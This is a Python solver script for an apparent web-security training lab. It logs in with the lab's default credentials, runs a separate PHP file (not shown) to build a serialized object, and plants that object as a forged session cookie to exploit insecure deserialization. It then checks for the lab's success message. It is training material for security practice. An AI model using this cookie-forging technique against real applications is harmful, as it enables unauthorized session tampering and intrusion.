import requests
from urllib.parse import quote_plus
import base64
import subprocess
import sys


class Solver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()

    def signing_in(self):
        data = {
            'username': 'wiener',
            'password': 'peter'
        }
        self.session.post(self.lab_url + 'login', data=data)

    def generating_the_serialized_object(self):
        serialized_object_string = subprocess.run(['php', sys.argv[0].replace('.py', '.php')], capture_output=True).stdout
        self.session.cookies['session'] = quote_plus(base64.urlsafe_b64encode(serialized_object_string))
        self.session.get(self.lab_url)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def start(self):
        self.signing_in()
        self.generating_the_serialized_object()
        self.checking_solution()


solver = Solver(sys.argv[1])
solver.start()
